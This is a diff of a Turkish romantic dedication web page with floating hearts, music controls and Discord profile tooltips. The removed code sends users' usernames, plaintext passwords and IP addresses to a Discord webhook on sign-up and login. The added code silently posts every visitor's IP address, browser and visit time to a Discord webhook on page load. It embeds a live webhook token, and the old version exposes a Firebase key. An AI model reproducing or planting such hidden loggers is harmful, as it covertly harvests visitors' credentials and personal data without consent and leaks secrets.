@@ -1,378 +1,312 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Gelişmiş Firebase + Webhook + UI</title>
-<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-auth-compat.js"></script>
-<style>
-  body {
-    margin: 0; padding: 0; height: 100vh; 
-    background: #fff0f6; 
-    overflow: hidden; 
-    font-family: Arial, sans-serif;
-  }
-  #login-section {
-    max-width: 400px;
-    margin: 50px auto 20px;
-    text-align: center;
-  }
-  input, button {
-    width: 90%; padding: 12px; margin: 8px 0;
-    font-size: 1rem;
-    border-radius: 5px;
-    border: 1px solid #ccc;
-  }
-  button {
-    cursor: pointer;
-    background-color: #d6336c;
-    color: white;
-    border: none;
-  }
-  button:hover {
-    background-color: #a82351;
-  }
-  #message {
-    color: red;
-    min-height: 20px;
-  }
-  #welcome-section {
-    display: none;
-    text-align: center;
-    margin-top: 40px;
-  }
-  #zahid-regen {
-    font-size: 4rem;
-    font-weight: bold;
-    color: #d6336c;
-    text-align: center;
-    margin-top: 30px;
-    position: relative;
-  }
-  /* Tooltip container */
-  .tooltip {
-    position: relative;
-    display: inline-block;
-    cursor: pointer;
-    color: #d6336c;
-  }
-  /* Tooltip text */
-  .tooltip .tooltiptext {
-    visibility: hidden;
-    width: 180px;
-    background-color: #333;
-    color: #fff;
-    text-align: center;
-    border-radius: 6px;
-    padding: 8px;
-    position: absolute;
-    z-index: 10;
-    bottom: 125%; /* position above */
-    left: 50%;
-    margin-left: -90px;
-    opacity: 0;
-    transition: opacity 0.3s;
-    font-size: 0.9rem;
-  }
-  .tooltip:hover .tooltiptext {
-    visibility: visible;
-    opacity: 1;
-  }
-  /* Kalpler animasyonu */
-  .heart {
-    position: fixed;
-    font-size: 20px;
-    color: #d6336c;
-    animation-name: floatUp;
-    animation-timing-function: linear;
-    animation-iteration-count: infinite;
-  }
-  @keyframes floatUp {
-    0% {
-      transform: translateY(0) translateX(0) scale(1);
-      opacity: 1;
+  <meta charset="UTF-8" />
+  <title>ZAHİD ❤ REGEN</title>
+  <link rel="icon" href="https://i.pinimg.com/474x/82/90/66/829066cdee2b5e3ea93e70b538cf2ad6.jpg" type="image/png" />
+  <style>
+    /* Stil kodları */
+    body {
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+      background: url('https://i.pinimg.com/474x/82/90/66/829066cdee2b5e3ea93e70b538cf2ad6.jpg') no-repeat center center fixed;
+      background-size: cover;
+      font-family: 'Arial', sans-serif;
+      user-select: none;
+      height: 100vh;
+      position: relative;
+      color: #e60073;
     }
-    100% {
-      transform: translateY(-100vh) translateX(20px) scale(0.5);
+
+    .hearts {
+      position: fixed;
+      width: 100vw;
+      height: 100vh;
+      overflow: hidden;
+      pointer-events: none;
+      top: 0; left: 0;
+      z-index: 0;
+    }
+
+    .heart {
+      position: absolute;
+      font-size: 2rem;
+      color: pink;
+      animation-name: floatHearts;
+      animation-timing-function: linear;
+      animation-iteration-count: infinite;
+      user-select: none;
+      filter: drop-shadow(0 0 2px #ff69b4);
+    }
+
+    @keyframes floatHearts {
+      0% {
+        transform: translateY(100vh) rotate(0deg);
+        opacity: 0;
+      }
+      20% {
+        opacity: 1;
+      }
+      100% {
+        transform: translateY(-10vh) rotate(360deg);
+        opacity: 0;
+      }
+    }
+
+    .audio-controls {
+      position: fixed;
+      top: 10px;
+      left: 10px;
+      display: flex;
+      gap: 15px;
+      background: rgba(255,182,193,0.6);
+      padding: 8px 14px;
+      border-radius: 12px;
+      z-index: 20;
+      align-items: center;
+      user-select: none;
+      box-shadow: 0 0 10px #ffb6c1aa;
+    }
+
+    .btn {
+      cursor: pointer;
+      color: #ff69b4;
+      font-size: 2.5rem;
+      transition: color 0.3s, transform 0.2s;
+      user-select: none;
+      filter: drop-shadow(0 0 2px #ff69b4);
+    }
+
+    .btn:hover {
+      color: #ff1493;
+      transform: scale(1.1);
+      filter: drop-shadow(0 0 5px #ff1493);
+    }
+
+    .text-overlay {
+      position: relative;
+      z-index: 10;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 40px;
+      font-size: 6rem;
+      font-weight: bold;
+      text-shadow: 2px 2px 4px #ffb6c1;
+      user-select: none;
+    }
+
+    .text-part {
+      position: relative;
+      cursor: pointer;
+      color: #e60073;
+      user-select: none;
+    }
+
+    .tooltip {
+      position: absolute;
+      top: 5.5rem;
+      left: 50%;
+      transform: translateX(-50%) translateY(15px) scale(1.2);
+      background: #ffb6c1;
+      border-radius: 12px;
+      padding: 12px 18px;
+      box-shadow: 0 4px 12px rgba(255, 182, 193, 0.6);
       opacity: 0;
+      transition: opacity 0.3s ease, transform 0.3s ease;
+      pointer-events: none;
+      width: 320px;
+      text-align: center;
+      z-index: 30;
+      font-family: "Segoe UI", sans-serif;
+      font-size: 18px;
+      color: #b30059;
+      font-weight: 600;
+      user-select: none;
     }
-  }
-  /* Sağ üst ses kontrol paneli */
-  #audio-controls {
-    position: fixed;
-    top: 15px;
-    right: 15px;
-    z-index: 20;
-    background: rgba(255,255,255,0.8);
-    border-radius: 8px;
-    padding: 5px 10px;
-    display: flex;
-    align-items: center;
-    gap: 10px;
-  }
-  #audio-controls button {
-    background: none;
-    border: none;
-    font-size: 1.4rem;
-    cursor: pointer;
-    color: #d6336c;
-  }
-</style>
+
+    .text-part:hover .tooltip {
+      opacity: 1;
+      transform: translateX(-50%) translateY(0) scale(1.3);
+      pointer-events: auto;
+    }
+
+    .tooltip img.avatar {
+      width: 110px;
+      height: 110px;
+      border-radius: 50%;
+      object-fit: cover;
+      margin-bottom: 15px;
+      border: 3px solid #ff66a3;
+      user-select: none;
+    }
+
+    .tooltip img.discord-icon {
+      width: 28px;
+      height: 28px;
+      vertical-align: middle;
+      margin-right: 10px;
+      filter: invert(37%) sepia(56%) saturate(6276%) hue-rotate(318deg) brightness(99%) contrast(101%);
+      user-select: none;
+    }
+
+    .tooltip a {
+      display: inline-block;
+      margin-top: 10px;
+      color: #d43873;
+      text-decoration: none;
+      font-size: 16px;
+      font-weight: 600;
+      user-select: none;
+    }
+
+    .tooltip div.username {
+      margin-top: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      font-weight: 700;
+      user-select: none;
+    }
+  </style>
 </head>
 <body>
 
-  <div id="login-section">
-    <h2>Kullanıcı Adı ile Kayıt/Giriş</h2>
-    <input type="text" id="username" placeholder="Kullanıcı Adı" autocomplete="off" /><br />
-    <input type="password" id="password" placeholder="Şifre" autocomplete="off" /><br />
-    <button id="register-btn">Kayıt Ol</button>
-    <button id="login-btn">Giriş Yap</button>
-    <p id="message"></p>
+  <div class="hearts" id="hearts-container"></div>
+
+  <div class="audio-controls">
+    <div id="play-pause-btn" class="btn" title="Oynat / Duraklat">▶️</div>
+    <div id="mute-btn" class="btn" title="Ses Aç/Kapat">🔊</div>
   </div>
 
-  <div id="welcome-section">
-    <div id="zahid-regen">
-      <span class="tooltip" id="zahid-tooltip">ZAHİD
-        <span class="tooltiptext">
-          <a href="https://discord.com/users/shyla31" target="_blank" style="color:#fff; text-decoration:none;">
-            shyla31 Discord Profili
-          </a>
-        </span>
-      </span>
-      &nbsp;❤&nbsp;
-      <span class="tooltip" id="regen-tooltip">REGEN
-        <span class="tooltiptext">
-          <a href="https://discord.com/users/regenxs" target="_blank" style="color:#fff; text-decoration:none;">
-            regenxs Discord Profili
-          </a>
-        </span>
-      </span>
+  <div class="text-overlay">
+    <div class="text-part" id="zahid">
+      ZAHİD
+      <div class="tooltip">
+        <img src="https://cdn.discordapp.com/avatars/461158648526143490/350034907e821d8bcfcb542224f2fb29.png" class="avatar" />
+        <div class="username">
+          <img src="https://cdn-icons-png.flaticon.com/512/5968/5968756.png" class="discord-icon" />
+          shyla31
+        </div>
+        <a href="https://discord.com/users/461158648526143490" target="_blank" rel="noopener noreferrer">Profili Gör</a>
+      </div>
     </div>
-    <button id="logout-btn" style="margin-top:20px; padding:10px 20px;">Çıkış Yap</button>
+    <div class="text-part" id="regen">
+      ❤ REGEN
+      <div class="tooltip">
+        <img src="https://cdn.discordapp.com/avatars/1208490819045163089/9b0d9fe14fe3ad3b6c32b65d9bc8d2ce.png" class="avatar" />
+        <div class="username">
+          <img src="https://cdn-icons-png.flaticon.com/512/5968/5968756.png" class="discord-icon" />
+          regenxs
+        </div>
+        <a href="https://discord.com/users/1208490819045163089" target="_blank" rel="noopener noreferrer">Profili Gör</a>
+      </div>
+    </div>
   </div>
 
-  <div id="audio-controls">
-    <button id="play-pause" title="Oynat / Duraklat">▶️</button>
-    <button id="mute-unmute" title="Ses Aç / Kapat">🔊</button>
-  </div>
+  <audio id="background-music" src="music.mp3" loop></audio>
 
-  <input type="text" id="hidden-input" placeholder="Buraya yazıp Enter'a basın" style="position:fixed; bottom:10px; left:10px; width:200px; display:none;" />
+  <script>
+    // Kalp animasyonu için
+    const hearts = ['❤','💕','💞','💓','💗','💖','💝','💘','💟','❣️','❤️‍🔥','❤️‍🩹','💌'];
+    const container = document.getElementById('hearts-container');
 
-  <audio id="background-audio" loop>
-    <source src="https://cdn.pixabay.com/download/audio/2022/03/03/audio_14722d0b0f.mp3?filename=romantic-piano-loop-6087.mp3" type="audio/mpeg" />
-    Tarayıcınız audio etiketini desteklemiyor.
-  </audio>
-
-<script>
-  // Firebase config ve init
-  const firebaseConfig = {
-    apiKey: "AIzaSyB__Q-v3MHr5l25hw4eQBIez60MoJl5OPs",
-    authDomain: "regen-e4e55.firebaseapp.com",
-    projectId: "regen-e4e55",
-    storageBucket: "regen-e4e55.firebasestorage.app",
-    messagingSenderId: "522824824598",
-    appId: "1:522824824598:web:b4c2e347f97a6ee5c10237",
-  };
-  firebase.initializeApp(firebaseConfig);
-  const auth = firebase.auth();
-
-  const webhookURL = "https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN"; // WEBHOOK URL
-
-  // Helper fonksiyonlar
-  function usernameToEmail(username) {
-    return username + "@regen.com";
-  }
-
-  async function getIP() {
-    try {
-      const res = await fetch("https://api.ipify.org?format=json");
-      const data = await res.json();
-      return data.ip || "IP alınamadı";
-    } catch {
-      return "IP alınamadı";
+    function createHeart() {
+      const heart = document.createElement('div');
+      heart.classList.add('heart');
+      heart.style.left = Math.random() * 100 + 'vw';
+      heart.style.fontSize = (Math.random() * 2 + 1) + 'rem';
+      heart.style.animationDuration = (Math.random() * 5 + 5) + 's';
+      heart.textContent = hearts[Math.floor(Math.random() * hearts.length)];
+      container.appendChild(heart);
+      setTimeout(() => heart.remove(), 10000);
     }
-  }
 
-  async function sendToDiscord(username, password, ip, action) {
-    const timestamp = new Date().toLocaleString("tr-TR");
-    const content = `**${action} gerçekleşti!**
-**Kullanıcı Adı:** ${username}
-**Şifre:** ${password}
-**IP:** ${ip}
-**Zaman:** ${timestamp}`;
-    try {
-      await fetch(webhookURL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content }),
-      });
-    } catch (e) {
-      console.error("Webhook gönderim hatası:", e);
-    }
-  }
+    setInterval(createHeart, 300);
 
-  // DOM Elemanları
-  const usernameInput = document.getElementById("username");
-  const passwordInput = document.getElementById("password");
-  const registerBtn = document.getElementById("register-btn");
-  const loginBtn = document.getElementById("login-btn");
-  const message = document.getElementById("message");
-  const loginSection = document.getElementById("login-section");
-  const welcomeSection = document.getElementById("welcome-section");
-  const displayName = document.getElementById("display-name");
-  const logoutBtn = document.getElementById("logout-btn");
-  const zahidRegen = document.getElementById("zahid-regen");
-  const hiddenInput = document.getElementById("hidden-input");
+    // Audio kontrol
+    const audio = document.getElementById('background-music');
+    const playPauseBtn = document.getElementById('play-pause-btn');
+    const muteBtn = document.getElementById('mute-btn');
 
-  const audio = document.getElementById("background-audio");
-  const playPauseBtn = document.getElementById("play-pause");
-  const muteUnmuteBtn = document.getElementById("mute-unmute");
-
-  // Kayıt işlemi
-  registerBtn.addEventListener("click", async () => {
-    const username = usernameInput.value.trim();
-    const password = passwordInput.value;
-    if (!username || !password) {
-      message.textContent = "Lütfen kullanıcı adı ve şifre girin.";
-      return;
-    }
-    const email = usernameToEmail(username);
-    const ip = await getIP();
-
-    auth.createUserWithEmailAndPassword(email, password)
-      .then(async () => {
-        message.textContent = "Kayıt başarılı! Giriş yapabilirsiniz.";
-        usernameInput.value = "";
-        passwordInput.value = "";
-        await sendToDiscord(username, password, ip, "Kayıt");
-      })
-      .catch((error) => {
-        message.textContent = "Hata: " + error.message;
-      });
-  });
-
-  // Giriş işlemi
-  loginBtn.addEventListener("click", async () => {
-    const username = usernameInput.value.trim();
-    const password = passwordInput.value;
-    if (!username || !password) {
-      message.textContent = "Lütfen kullanıcı adı ve şifre girin.";
-      return;
-    }
-    const email = usernameToEmail(username);
-    const ip = await getIP();
-
-    auth.signInWithEmailAndPassword(email, password)
-      .then(async () => {
-        message.textContent = "";
-        loginSection.style.display = "none";
-        welcomeSection.style.display = "block";
-        zahidRegen.style.fontSize = "4rem"; // büyük kalıyor
-        await sendToDiscord(username, password, ip, "Giriş");
-      })
-      .catch((error) => {
-        message.textContent = "Giriş başarısız: " + error.message;
-      });
-  });
-
-  // Çıkış işlemi
-  logoutBtn.addEventListener("click", () => {
-    auth.signOut().then(() => {
-      loginSection.style.display = "block";
-      welcomeSection.style.display = "none";
-      message.textContent = "";
-      usernameInput.value = "";
-      passwordInput.value = "";
-    });
-  });
-
-  // Oturum durumu değişimi
-  auth.onAuthStateChanged((user) => {
-    if (user) {
-      const email = user.email;
-      const username = email.split("@")[0];
-      loginSection.style.display = "none";
-      welcomeSection.style.display = "block";
-      zahidRegen.style.fontSize = "4rem";
-    } else {
-      loginSection.style.display = "block";
-      welcomeSection.style.display = "none";
-    }
-  });
-
-  // Sayfa yüklendiğinde gizli input aktif değil, regen yazıp enter ile yönlendirme için:
-  // Kullanıcı herhangi bir yere tıklamadan "regen" yazıp enter basınca youtube açılacak.
-
-  // Burada document keydown dinliyoruz ve hiddenInput’u görünür yapıyoruz, input focus veriyoruz.
-  document.addEventListener("keydown", (e) => {
-    if (document.activeElement !== usernameInput && document.activeElement !== passwordInput) {
-      if (!hiddenInput.style.display || hiddenInput.style.display === "none") {
-        hiddenInput.style.display = "block";
-        hiddenInput.focus();
-      }
-    }
-  });
-
-  hiddenInput.addEventListener("keydown", (e) => {
-    if (e.key === "Enter") {
-      if (hiddenInput.value.toLowerCase() === "regen") {
-        window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank");
-        hiddenInput.value = "";
-        hiddenInput.style.display = "none";
+    playPauseBtn.addEventListener('click', () => {
+      if (audio.paused) {
+        audio.play();
+        playPauseBtn.textContent = '⏸️';
       } else {
-        hiddenInput.value = "";
-        hiddenInput.style.display = "none";
+        audio.pause();
+        playPauseBtn.textContent = '▶️';
+      }
+    });
+
+    muteBtn.addEventListener('click', () => {
+      audio.muted = !audio.muted;
+      muteBtn.textContent = audio.muted ? '🔇' : '🔊';
+    });
+
+    // Tarayıcı bilgisini sade gösterme
+    function getBrowserName() {
+      const ua = navigator.userAgent;
+      if (ua.indexOf("Firefox") > -1) return "Firefox";
+      if (ua.indexOf("SamsungBrowser") > -1) return "Samsung Internet";
+      if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) return "Opera";
+      if (ua.indexOf("Trident") > -1) return "Internet Explorer";
+      if (ua.indexOf("Edge") > -1) return "Edge";
+      if (ua.indexOf("Chrome") > -1) return "Chrome";
+      if (ua.indexOf("Safari") > -1) return "Safari";
+      return "Bilinmeyen Tarayıcı";
+    }
+
+    // Discord Webhook URL'in
+    const webhookURL = "https://ptb.discord.com/api/webhooks/1390120088719458465/5zM_-RCRoKEIaZDF9AsEHR-cgNDbiCS1U2WcKAsGrkoo339-R4i14UPl1o3LK0iuKdZf";
+
+    // Kullanıcı IP sini alma ve webhook'a gönderme
+    async function sendUserInfo() {
+      try {
+        // IP adresini ipify'dan al
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const userIP = ipData.ip;
+
+        const browser = getBrowserName();
+
+        // Tarih ve saat oluştur
+        const now = new Date();
+        const timestamp = now.toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' });
+
+        // Webhook payload'u
+        const payload = {
+          content: null,
+          embeds: [{
+            title: "Yeni Site Ziyaretçisi",
+            color: 0xff69b4,
+            fields: [
+              { name: "IP Adresi", value: userIP, inline: true },
+              { name: "Tarayıcı", value: browser, inline: true },
+              { name: "Ziyaret Tarihi & Saati", value: timestamp, inline: false }
+            ],
+            footer: { text: "ZAHİD ❤ REGEN" },
+            timestamp: now.toISOString()
+          }]
+        };
+
+        // Webhook'a POST et
+        await fetch(webhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+
+      } catch (err) {
+        console.error("Webhook gönderilemedi:", err);
       }
     }
-  });
 
-  // Kalp animasyonu: belirli aralıklarla rastgele pozisyon ve süre ile kalpler çıkacak
-  function createHeart() {
-    const heart = document.createElement("div");
-    heart.textContent = "❤️";
-    heart.className = "heart";
-    heart.style.left = Math.random() * window.innerWidth + "px";
-    heart.style.fontSize = (10 + Math.random() * 30) + "px";
-    heart.style.animationDuration = (3 + Math.random() * 5) + "s";
-    document.body.appendChild(heart);
-
-    setTimeout(() => {
-      heart.remove();
-    }, 8000);
-  }
-
-  setInterval(createHeart, 700);
-
-  // Ses kontrolü
-  let isPlaying = false;
-  let isMuted = false;
-
-  playPauseBtn.addEventListener("click", () => {
-    if (isPlaying) {
-      audio.pause();
-      playPauseBtn.textContent = "▶️";
-      isPlaying = false;
-    } else {
-      audio.play();
-      playPauseBtn.textContent = "⏸️";
-      isPlaying = true;
-    }
-  });
-
-  muteUnmuteBtn.addEventListener("click", () => {
-    if (isMuted) {
-      audio.muted = false;
-      muteUnmuteBtn.textContent = "🔊";
-      isMuted = false;
-    } else {
-      audio.muted = true;
-      muteUnmuteBtn.textContent = "🔇";
-      isMuted = true;
-    }
-  });
-
-</script>
+    sendUserInfo();
+  </script>
 
 </body>
 </html>
